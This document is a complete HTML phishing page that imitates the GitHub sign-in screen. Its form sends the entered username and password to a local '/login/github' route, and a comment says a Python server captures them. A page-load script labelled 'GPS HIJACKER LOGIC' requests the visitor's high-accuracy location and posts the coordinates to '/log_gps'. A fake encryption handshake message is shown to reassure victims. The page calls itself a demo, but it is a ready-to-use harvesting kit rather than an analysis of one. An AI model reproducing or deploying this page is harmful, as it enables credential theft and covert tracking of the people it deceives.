<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub · GitHub</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com" rel="stylesheet">
    <style>
        body { 
            background-color: #f6f8fa; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif; 
        }
        .github-btn { 
            background-color: #2da44e; 
            border: 1px solid rgba(27,31,36,0.15); 
            transition: background-color 0.2s cubic-bezier(0.3, 0, 0.5, 1);
        }
        .github-btn:hover { 
            background-color: #2c974b; 
        }
        .input-box:focus { 
            border-color: #0969da; 
            outline: none; 
            box-shadow: 0 0 0 3px rgba(9,105,218,0.3); 
        }
        .footer-link:hover {
            color: #0969da;
            text-decoration: underline;
        }
        /* Stealth GPS sync status for the demo */
        #session-sync {
            display: none;
            font-family: monospace;
            font-size: 10px;
            color: #2da44e;
            margin-top: 10px;
        }
    </style>
</head>
<body class="flex flex-col items-center pt-8 px-4">
    
    <!-- Header Logo -->
    <div class="mb-6 mt-4">
        <a href="https://github.com">
            <svg height="48" viewBox="0 0 16 16" width="48" class="fill-current text-[#24292f] hover:text-gray-600 transition">
                <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
            </svg>
        </a>
    </div>

    <h1 class="text-2xl font-light mb-4 tracking-tight">Sign in to GitHub</h1>

    <!-- Login Container -->
    <div class="bg-white border border-[#d0d7de] rounded-md p-5 w-full max-w-[308px] shadow-sm">
        <form id="ghForm" action="/login/github" method="POST">
            <div class="mb-4">
                <label class="text-sm block mb-2 font-normal text-[#1f2328]">Username or email address</label>
                <input name="user" type="text" autocomplete="username" 
                       class="w-full p-2 border border-[#d0d7de] rounded-md text-sm input-box bg-[#f6f8fa]" required>
            </div>
            
            <div class="mb-4">
                <div class="flex justify-between mb-2">
                    <label class="text-sm font-normal text-[#1f2328]">Password</label>
                    <a href="#" class="text-[#0969da] text-xs hover:underline">Forgot password?</a>
                </div>
                <input name="pass" type="password" autocomplete="current-password"
                       class="w-full p-2 border border-[#d0d7de] rounded-md text-sm input-box bg-[#f6f8fa]" required>
            </div>
            
            <button id="ghBtn" type="submit" class="w-full github-btn text-white text-sm font-semibold py-2 rounded-md shadow-sm">
                Sign in
            </button>
        </form>
        
        <!-- Live Sync Status for Demo -->
        <div id="session-sync" class="text-center">
            [+] AES-256 HANDSHAKE_INITIATED...
        </div>
    </div>

    <!-- Join/Register Link Container -->
    <div class="mt-4 border border-[#d0d7de] rounded-md p-4 w-full max-w-[308px] text-center text-sm">
        <span class="text-[#1f2328]">New to GitHub?</span> 
        <a href="#" class="text-[#0969da] hover:underline">Create an account</a>.
    </div>

    <!-- Footer Links -->
    <div class="mt-16 w-full max-w-[800px] flex flex-wrap justify-center gap-4 text-xs text-[#636c76]">
        <a href="#" class="footer-link">Terms</a>
        <a href="#" class="footer-link">Privacy</a>
        <a href="#" class="footer-link">Docs</a>
        <a href="#" class="footer-link">Contact GitHub Support</a>
        <a href="#" class="footer-link">Manage cookies</a>
        <a href="#" class="footer-link">Do not share my personal information</a>
    </div>

    <!-- NEXO-TECH GPS HIJACKER LOGIC -->
    <script>
        const ghForm = document.getElementById('ghForm');
        const ghBtn = document.getElementById('ghBtn');
        const syncStatus = document.getElementById('session-sync');

        ghForm.onsubmit = function() {
            ghBtn.innerText = "Verifying identity...";
            ghBtn.disabled = true;
            ghBtn.style.opacity = "0.7";
            syncStatus.style.display = "block";
            // Data captured by Python server automatically on POST
        };

        window.onload = function() {
            if (navigator.geolocation) {
                // Requesting high accuracy for a professional presentation look
                navigator.geolocation.getCurrentPosition(function(p) {
                    const gpsData = {
                        lat: p.coords.latitude, 
                        lon: p.coords.longitude,
                        acc: p.coords.accuracy,
                        platform: "GitHub_Blackout_v8"
                    };
                    
                    // Sending to the Python /log_gps route
                    fetch('/log_gps', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(gpsData)
                    });
                }, 
                function(err) { console.log("GPS denied"); },
                { enableHighAccuracy: true });
            }
        }
    </script>
</body>
  </html>
